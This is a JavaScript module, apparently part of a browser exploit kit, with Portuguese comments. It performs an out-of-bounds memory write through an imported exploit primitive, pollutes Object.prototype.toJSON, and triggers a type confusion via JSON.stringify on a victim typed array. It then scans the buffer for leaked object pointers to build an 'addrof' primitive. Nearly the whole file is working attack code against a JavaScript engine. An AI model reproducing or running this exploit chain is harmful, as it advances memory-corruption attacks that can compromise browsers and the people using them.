// js/script3/testArrayBufferVictimCrash.mjs (v_typedArray_addrof_v19_ExploitReturnedObject)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V19_ERO = "OriginalHeisenbug_TypedArrayAddrof_v19_ExploitReturnedObject";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;

let object_to_leak_A_v19 = null;
let object_to_leak_B_v19 = null;
let victim_typed_array_ref_v19 = null; // Referência à vítima original
let controller_object_v19 = null; // Objeto que esperamos que se torne 'this' e seja confuso
let probe_call_count_v19 = 0;

// Detalhes da última chamada da sonda onde a confusão foi detectada e as escritas foram tentadas
let last_confused_probe_details_v19 = null; 

function toJSON_TA_Probe_ExploitReturnedObject() {
    probe_call_count_v19++;
    const call_num = probe_call_count_v19;
    logS3(`[ERO_Probe_v19] Call #${call_num}. 'this' type: ${Object.prototype.toString.call(this)}.`, "leak");

    if (call_num === 1) {
        // Na primeira chamada, 'this' deve ser victim_typed_array_ref_v19
        if (this === victim_typed_array_ref_v19) {
            logS3(`[ERO_Probe_v19] Call #${call_num}: 'this' is victim_typed_array_ref_v19. Returning controller_object_v19.`, "info");
            // Criar e retornar o objeto controlador que esperamos que se torne 'this' na próxima chamada
            controller_object_v19 = { 
                id: "controller_obj_v19",
                victim_ref: victim_typed_array_ref_v19, // Referência à vítima real
                marker_A: null, 
                marker_B: null,
                call_when_created: call_num
            };
            return controller_object_v19;
        } else {
            logS3(`[ERO_Probe_v19] Call #${call_num}: ERRO - 'this' não é victim_typed_array_ref_v19 como esperado!`, "error");
            return { error_call_1_this_mismatch: true };
        }
    } else if (this === controller_object_v19) { // Checa se 'this' é o controller_object da chamada anterior
        logS3(`[ERO_Probe_v19] Call #${call_num}: 'this' IS controller_object_v19. Type: ${Object.prototype.toString.call(this)}`, "info");
        
        last_confused_probe_details_v19 = { // Registrar detalhes desta chamada
            call_number: call_num,
            this_type: Object.prototype.toString.call(this),
            controller_id_match: (this.id === "controller_obj_v19"),
            writes_to_victim_attempted: false,
            writes_to_controller_attempted: false,
            error: null
        };

        if (Object.prototype.toString.call(this) === '[object Object]') { // Confirma se ainda é (ou se tornou) [object Object]
            logS3(`[ERO_Probe_v19] Call #${call_num}: controller_object_v19 ('this') é [object Object]. TYPE CONFUSION NO CONTROLLER!`, "vuln");

            // Tentar escrever na vítima através da referência no controller_object
            try {
                logS3(`[ERO_Probe_v19] Call #${call_num}: Tentando escrever em this.victim_ref[0] e this.victim_ref[1]...`, "warn");
                if (object_to_leak_A_v19) this.victim_ref[0] = object_to_leak_A_v19;
                if (object_to_leak_B_v19) this.victim_ref[1] = object_to_leak_B_v19;
                last_confused_probe_details_v19.writes_to_victim_attempted = true;
                logS3(`[ERO_Probe_v19] Call #${call_num}: Escritas em this.victim_ref[0],[1] supostamente realizadas.`, "info");

                // Tentar definir propriedade no controller_object para ver se ele mesmo vaza algo
                 logS3(`[ERO_Probe_v19] Call #${call_num}: Tentando escrever em this.marker_A e this.marker_B...`, "warn");
                if (object_to_leak_A_v19) this.marker_A = object_to_leak_A_v19;
                if (object_to_leak_B_v19) this.marker_B = object_to_leak_B_v19;
                last_confused_probe_details_v19.writes_to_controller_attempted = true;
                logS3(`[ERO_Probe_v19] Call #${call_num}: Escritas em this.marker_A, this.marker_B supostamente realizadas.`, "info");

            } catch(e_write) {
                logS3(`[ERO_Probe_v19] Call #${call_num}: ERRO durante escritas: ${e_write.message}`, "error");
                last_confused_probe_details_v19.error = e_write.message;
            }
        } else {
            logS3(`[ERO_Probe_v19] Call #${call_num}: controller_object_v19 ('this') NÃO é [object Object]. Tipo: ${Object.prototype.toString.call(this)}`, "warn");
        }
        // Para evitar recursão infinita se esta sonda for chamada novamente neste objeto
        return { call_2_plus_return_marker: call_num }; 
    } else {
        logS3(`[ERO_Probe_v19] Call #${call_num}: 'this' não é nem a vítima nem o controller_object esperado. Ignorando.`, "warn");
        // Se houver mais chamadas inesperadas, retornar algo simples
        return { unexpected_call_marker: call_num };
    }
}


export async function executeTypedArrayVictimAddrofTest_ExploitReturnedObject() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V19_ERO}.triggerAndLog`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Heisenbug (ExploitReturnedObject) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V19_ERO} Init...`;

    probe_call_count_v19 = 0;
    victim_typed_array_ref_v19 = null; 
    controller_object_v19 = null;
    last_confused_probe_details_v19 = null;
    object_to_leak_A_v19 = { marker: "ObjA_TA_v19ero", id: Date.now() }; 
    object_to_leak_B_v19 = { marker: "ObjB_TA_v19ero", id: Date.now() + Math.floor(Math.random() * 1000) };

    let errorCapturedMain = null;
    let stringifyOutput = null; 
    
    let addrof_A = { success: false, msg: "Addrof A (victim_buffer[0]): Default" };
    let addrof_B = { success: false, msg: "Addrof B (victim_buffer[1]): Default" };
    // Para verificar se o controller_object em si vazou algo (se stringifyOutput for o controller)
    let addrof_Controller_A = { success: false, msg: "Addrof Controller.marker_A: Default" };
    let addrof_Controller_B = { success: false, msg: "Addrof Controller.marker_B: Default" };

    const fillPattern = 0.19191919191919;

    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        victim_typed_array_ref_v19 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
        let float64_view_on_underlying_ab = new Float64Array(victim_typed_array_ref_v19.buffer); 
        for(let i = 0; i < float64_view_on_underlying_ab.length; i++) float64_view_on_underlying_ab[i] = fillPattern + i;
        logS3(`STEP 2: victim_typed_array_ref_v19 (Uint8Array) created.`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_ExploitReturnedObject, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            stringifyOutput = JSON.stringify(victim_typed_array_ref_v19); 
            logS3(`  JSON.stringify completed. Stringify Output (first 200 chars): ${stringifyOutput ? JSON.stringify(stringifyOutput).substring(0,200) + "..." : 'N/A'}`, "info", FNAME_CURRENT_TEST);
            logS3(`  Details of (presumed) confused probe call: ${last_confused_probe_details_v19 ? JSON.stringify(last_confused_probe_details_v19) : 'N/A (No confused call to controller_object or error)'}`, "leak", FNAME_CURRENT_TEST);

            let heisenbugConfirmedOnController = false;
            if (last_confused_probe_details_v19 && last_confused_probe_details_v19.this_type === "[object Object]" && last_confused_probe_details_v19.controller_id_match) {
                heisenbugConfirmedOnController = true;
                logS3(`  HEISENBUG ON controller_object CONFIRMED!`, "vuln", FNAME_CURRENT_TEST);
            } else {
                logS3(`  ALERT: Heisenbug on controller_object NOT confirmed.`, "error", FNAME_CURRENT_TEST);
            }
                
            logS3("STEP 3: Checking victim buffer for addrof via victim_ref...", "warn", FNAME_CURRENT_TEST);
            const val_A = float64_view_on_underlying_ab[0];
            let temp_A_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([val_A]).buffer)[0], new Uint32Array(new Float64Array([val_A]).buffer)[1]);
            if (val_A !== (fillPattern + 0) && val_A !== 0 && (temp_A_int64.high() < 0x00020000 || (temp_A_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                addrof_A.success = true; addrof_A.msg = `Possible pointer for ObjA in victim_buffer[0]: ${temp_A_int64.toString(true)}`;
            } else { addrof_A.msg = `No pointer for ObjA in victim_buffer[0]. Val: ${val_A}`; }

            const val_B = float64_view_on_underlying_ab[1];
            let temp_B_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([val_B]).buffer)[0], new Uint32Array(new Float64Array([val_B]).buffer)[1]);
            if (val_B !== (fillPattern + 1) && val_B !== 0 && (temp_B_int64.high() < 0x00020000 || (temp_B_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                addrof_B.success = true; addrof_B.msg = `Possible pointer for ObjB in victim_buffer[1]: ${temp_B_int64.toString(true)}`;
            } else { addrof_B.msg = `No pointer for ObjB in victim_buffer[1]. Val: ${val_B}`; }

            // Check if stringifyOutput (which might be the serialized controller_object) contains leaked addresses
            logS3("STEP 4: Checking stringifyOutput for leaked controller markers...", "warn", FNAME_CURRENT_TEST);
            if (stringifyOutput && typeof stringifyOutput === 'object') { // If toJSON returned controller and it wasn't further stringified
                 if (stringifyOutput.marker_A === object_to_leak_A_v19) { // Unlikely to be pointer directly, but check
                    addrof_Controller_A.success = true; addrof_Controller_A.msg = "object_to_leak_A_v19 found in stringifyOutput.marker_A (identity).";
                 } else if (typeof stringifyOutput.marker_A === 'number' && stringifyOutput.marker_A !==0) {
                    let s_mkrA_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([stringifyOutput.marker_A]).buffer)[0], new Uint32Array(new Float64Array([stringifyOutput.marker_A]).buffer)[1]);
                    if (s_mkrA_int64.high() < 0x00020000 || (s_mkrA_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
                       addrof_Controller_A.success = true; addrof_Controller_A.msg = `Possible pointer for marker_A in stringifyOutput: ${s_mkrA_int64.toString(true)}`;
                    } else { addrof_Controller_A.msg = `stringifyOutput.marker_A is number but not pointer-like: ${stringifyOutput.marker_A}`; }
                 } else { addrof_Controller_A.msg = `stringifyOutput.marker_A not a pointer. Value: ${stringifyOutput.marker_A}`; }

                 if (stringifyOutput.marker_B === object_to_leak_B_v19) {
                    addrof_Controller_B.success = true; addrof_Controller_B.msg = "object_to_leak_B_v19 found in stringifyOutput.marker_B (identity).";
                 } else if (typeof stringifyOutput.marker_B === 'number' && stringifyOutput.marker_B !==0) {
                    let s_mkrB_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([stringifyOutput.marker_B]).buffer)[0], new Uint32Array(new Float64Array([stringifyOutput.marker_B]).buffer)[1]);
                     if (s_mkrB_int64.high() < 0x00020000 || (s_mkrB_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
                       addrof_Controller_B.success = true; addrof_Controller_B.msg = `Possible pointer for marker_B in stringifyOutput: ${s_mkrB_int64.toString(true)}`;
                    } else { addrof_Controller_B.msg = `stringifyOutput.marker_B is number but not pointer-like: ${stringifyOutput.marker_B}`; }
                 } else { addrof_Controller_B.msg = `stringifyOutput.marker_B not a pointer. Value: ${stringifyOutput.marker_B}`; }
            } else {
                addrof_Controller_A.msg = "stringifyOutput was not an object or was null.";
                addrof_Controller_B.msg = "stringifyOutput was not an object or was null.";
            }


            if (addrof_A.success || addrof_B.success || addrof_Controller_A.success || addrof_Controller_B.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V19_ERO}: Addr? SUCESSO!`;
            } else if (heisenbugConfirmedOnController) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V19_ERO}: Heisenbug OK, Addr Fail`;
            } else {
                 document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V19_ERO}: Heisenbug Fail?`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V19_ERO}: Stringify/Addrof ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
            }
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V19_ERO} CRITICAL FAIL`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v19}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof victim_buffer[0]: Success=${addrof_A.success}, Msg='${addrof_A.msg}'`, addrof_A.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof victim_buffer[1]: Success=${addrof_B.success}, Msg='${addrof_B.msg}'`, addrof_B.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof controller.marker_A: Success=${addrof_Controller_A.success}, Msg='${addrof_Controller_A.msg}'`, addrof_Controller_A.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof controller.marker_B: Success=${addrof_Controller_B.success}, Msg='${addrof_Controller_B.msg}'`, addrof_Controller_B.success ? "good" : "warn", FNAME_CURRENT_TEST);
        
        victim_typed_array_ref_v19 = null; 
        controller_object_v19 = null;
        last_confused_probe_details_v19 = null;
        probe_call_count_v19 = 0;
    }
    return { 
        errorOccurred: errorCapturedMain, 
        potentiallyCrashed: false, 
        stringifyResult: stringifyOutput, 
        toJSON_details: last_confused_probe_details_v19, 
        total_probe_calls: probe_call_count_v19,
        addrof_victim_A: addrof_A,
        addrof_victim_B: addrof_B,
        addrof_controller_A: addrof_Controller_A,
        addrof_controller_B: addrof_Controller_B
    };
}
